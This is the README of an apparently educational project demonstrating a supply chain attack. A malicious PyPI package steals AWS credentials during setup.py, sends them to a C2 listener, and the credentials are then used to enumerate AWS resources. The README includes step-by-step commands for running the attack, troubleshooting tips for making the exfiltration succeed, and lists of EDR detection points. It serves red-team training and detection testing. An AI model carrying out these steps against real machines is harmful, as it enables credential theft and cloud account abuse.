# Supply Chain Attack Demo

> **Production-ready educational security testing platform demonstrating supply chain attacks**

[![Tested](https://img.shields.io/badge/status-tested-success)](https://github.com/norsemen-local/supply-chain-attack-demo)
[![Demo Time](https://img.shields.io/badge/demo%20time-~5%20minutes-blue)](https://github.com/norsemen-local/supply-chain-attack-demo)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-lightgrey)](https://github.com/norsemen-local/supply-chain-attack-demo)

## 🎯 Overview

A complete end-to-end simulation demonstrating a realistic supply chain attack:

**Malicious PyPI Package → Credential Theft → Cloud Enumeration**

### Attack Chain

```
┌─────────────────┐      ┌──────────────────┐      ┌─────────────────┐
│  C2 Server      │      │  Victim Machine  │      │  AWS Cloud      │
│  (Linux)        │◄─────┤  (Windows/Linux) │      │                 │
│                 │ Creds│                  │      │                 │
│ • PyPI Server   │◄─────┤ • pip install    │      │ • S3 Buckets    │
│   (port 8080)   │      │ • aws-data-utils │      │ • IAM Users     │
│ • C2 Listener   │      │ • Credentials    │      │ • EC2 Instances │
│   (port 4444)   │      │   stolen         │      │                 │
│ • AWS Enum      │─────────────────────────────────►│ (Enumeration)  │
└─────────────────┘      └──────────────────┘      └─────────────────┘
```

**Phases:**
1. **Infrastructure** - C2 server hosts malicious PyPI repository
2. **Infection** - Victim installs package, credentials stolen during `setup.py` execution
3. **Exfiltration** - Credentials sent to C2 server over network
4. **Exploitation** - Attacker enumerates AWS resources using stolen credentials

---

## 📁 Project Structure

```
supply-chain-attack-demo/
├── README.md                          # This file
├── EXECUTION_GUIDE.md                 # Detailed step-by-step instructions
├── WARP.md                            # Troubleshooting & agent instructions
├── DEPLOYMENT_READY.md                # Deployment checklist
├── QUICK_START_CHECKLIST.md           # Quick reference
├── demo_aws_credentials.template      # AWS credentials template
│
├── 1-attacker-infrastructure/         # C2 server (Linux)
│   ├── quick_demo.sh                  # 🚀 AUTOMATED SETUP (recommended)
│   ├── c2_listener_only.py            # Standalone C2 listener
│   ├── c2_server.py                   # Combined C2 + PyPI server
│   ├── start_c2_only.sh               # Start C2 only
│   ├── start_pypi_only.sh             # Start PyPI only
│   └── requirements.txt               # Python dependencies
│
├── 2-malicious-package/               # Malicious package source
│   ├── build_and_upload.sh            # Build package with embedded C2 IP
│   ├── setup.py                       # Steals credentials during install
│   └── aws_data_utils/
│       └── __init__.py                # Package implementation
│
├── 3-victim-application/              # Victim machine setup (Windows/Linux)
│   ├── setup_aws_creds.ps1            # Setup fake AWS credentials (Windows)
│   ├── setup_victim.ps1               # Configure pip (Windows)
│   ├── trigger_attack.ps1             # 🚀 Execute attack (Windows)
│   ├── setup_victim.sh                # Configure pip (Linux)
│   ├── app.py                         # Demo application
│   └── requirements.txt               # Includes malicious dependency
│
├── 4-attacker-operations/             # Post-exploitation
│   ├── run_attack.sh                  # AWS enumeration script
│   ├── enumerate_aws.py               # AWS resource enumeration
│   └── requirements.txt               # boto3 dependency
│
└── 5-aws-infrastructure/              # AWS setup (optional)
    ├── setup_aws.sh                   # Create restricted IAM user
    ├── demo_aws_credentials           # Demo credentials
    └── restricted_user_policy.json    # Read-only IAM policy
```

---

## 🚀 Quick Start (5 Minutes)

### Prerequisites

- **C2 Server**: Linux machine with Python 3.8+, tmux
- **Victim Machine**: Windows or Linux with Python 3.8+, pip
- **Network**: Both machines can communicate
- **Optional**: AWS account for phase 4 (cloud enumeration)

---

## 📋 Execution Steps

### **Phase 1: C2 Server Setup (Linux)**

**Option A: Automated (Recommended)**

```bash
cd ~/supply-chain-attack-demo/1-attacker-infrastructure
./quick_demo.sh <C2_SERVER_IP>
```

**What it does:**
- Builds malicious package with embedded C2 IP
- Starts PyPI server (port 8080) in tmux session `pypi`
- Starts C2 listener (port 4444) in tmux session `c2`

**View logs:**
```bash
tmux attach -t pypi   # View PyPI server logs
tmux attach -t c2     # View C2 listener logs
# Detach: Ctrl+B then D
```

**Option B: Manual Setup**

See [EXECUTION_GUIDE.md](EXECUTION_GUIDE.md) for manual setup instructions.

---

### **Phase 2: Victim Setup & Attack**

#### **On Windows Victim:**

```powershell
cd C:\path\to\supply-chain-attack-demo\3-victim-application

# Step 1: Setup AWS credentials (one-time)
.\setup_aws_creds.ps1

# Step 2: Configure pip to use attacker's PyPI
.\setup_victim.ps1 <C2_SERVER_IP>

# Step 3: Trigger attack
.\trigger_attack.ps1 <C2_SERVER_IP>
```

#### **On Linux Victim:**

```bash
cd ~/supply-chain-attack-demo/3-victim-application

# Step 1: Setup AWS credentials
mkdir -p ~/.aws
cp ../5-aws-infrastructure/demo_aws_credentials ~/.aws/credentials

# Step 2: Configure pip
./setup_victim.sh <C2_SERVER_IP>

# Step 3: Trigger attack
export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf
pip install -r requirements.txt
```

---

### **Phase 3: Verify Credential Theft**

**On C2 Server:**

```bash
# Check C2 listener output
tmux attach -t c2
# Look for: "Credentials stolen!"

# View stolen credentials
cat ~/supply-chain-attack-demo/1-attacker-infrastructure/stolen_aws_credentials
```

---

### **Phase 4: AWS Enumeration (Optional)**

**On C2 Server:**

```bash
cd ~/supply-chain-attack-demo/4-attacker-operations
./run_attack.sh
```

**Enumerates:**
- S3 buckets
- IAM users
- EC2 instances
- Other AWS resources

---

## ✅ Success Indicators

- ✅ C2 listener shows "Credentials stolen!" message
- ✅ File created: `1-attacker-infrastructure/stolen_aws_credentials`
- ✅ Victim machine shows package installation completed
- ✅ AWS enumeration script runs without errors
- ✅ Cortex XDR alerts visible (if enabled)

---

## 🔧 Troubleshooting

### Common Issues

**Issue: Credentials not exfiltrated**
- Pip cached wheel instead of source distribution
- **Fix:** Run `pip cache purge` and reinstall with `--no-binary` flag
- See [WARP.md](WARP.md#issue-1-credentials-not-exfiltrated) for details

**Issue: "Using cached wheel"**
- **Fix:** `trigger_attack.ps1` automatically clears cache
- Manual: `pip cache purge && pip uninstall aws-data-utils -y`

**Issue: PyPI server not accessible**
- **Fix:** Check firewall, verify port 8080 open: `netstat -tuln | grep 8080`

**Issue: C2 connection refused**
- **Fix:** Verify C2 listener running: `netstat -tuln | grep 4444`

**Full troubleshooting guide:** [WARP.md](WARP.md#troubleshooting)

---

## 🧹 Cleanup

### **Victim Machine:**

```powershell
# Windows
pip uninstall aws-data-utils -y
Remove-Item ~\.aws\credentials -Force
```

```bash
# Linux
pip uninstall aws-data-utils -y
rm ~/.aws/credentials
```

### **C2 Server:**

```bash
# Stop tmux sessions
tmux kill-session -t pypi
tmux kill-session -t c2

# Remove stolen credentials
rm ~/supply-chain-attack-demo/1-attacker-infrastructure/stolen_*

# Remove built packages (optional)
rm -rf ~/supply-chain-attack-demo/1-attacker-infrastructure/packages/
```

### **AWS Cleanup (if using real credentials):**

```bash
aws iam delete-access-key --user-name demo-restricted-user --access-key-id <KEY_ID>
aws iam detach-user-policy --user-name demo-restricted-user --policy-arn <POLICY_ARN>
aws iam delete-user --user-name demo-restricted-user
```

---

## 🛡️ Detection Opportunities

### EDR/XDR Detection Points:

**Phase 1: Package Installation**
- Suspicious network connection during `pip install`
- Source distribution installation (not wheel)
- Connection to non-standard PyPI server

**Phase 2: Credential Access**
- Python process accessing `~/.aws/credentials`
- File read from sensitive credential locations
- Unusual process tree (`pip` → `python setup.py`)

**Phase 3: Exfiltration**
- Outbound connection to unknown IP during package install
- Data transmission to non-corporate destination
- Network connection from `setup.py` script

**Phase 4: Cloud Abuse**
- AWS API enumeration from unexpected source IP
- High-volume AWS API calls (enumeration pattern)
- Access to multiple AWS services in short timeframe

### Cortex XDR Alerts Expected:
- Process execution chain anomaly
- Sensitive file access
- Network connection to suspicious endpoint
- AWS API abuse pattern

---

## ⚠️ Security & Ethics

### **Lab Environment Only**

- ✅ Use only in isolated lab environments
- ✅ Restricted IAM credentials with **read-only** permissions
- ✅ No production systems or credentials
- ✅ All activities monitored and logged

### **Educational Purpose**

This project is designed for:
- Security awareness training
- Red team / blue team exercises
- EDR/XDR detection testing
- Supply chain attack research

**Do NOT use for malicious purposes.**

---

## 📚 Documentation

- **[EXECUTION_GUIDE.md](EXECUTION_GUIDE.md)** - Detailed step-by-step instructions
- **[WARP.md](WARP.md)** - Complete troubleshooting guide
- **[DEPLOYMENT_READY.md](DEPLOYMENT_READY.md)** - Deployment checklist
- **[QUICK_START_CHECKLIST.md](QUICK_START_CHECKLIST.md)** - Quick reference card

---

## 🤝 Contributing

Contributions welcome! Please ensure:
- All changes maintain educational/research focus
- Code follows existing patterns
- Documentation updated accordingly
- Security considerations addressed

---

## 📄 License

This project is provided for educational and research purposes. Use responsibly.

---

## 🙏 Acknowledgments

Developed for cybersecurity education and defensive security testing.

**Co-Authored-By: Warp <agent@warp.dev>**
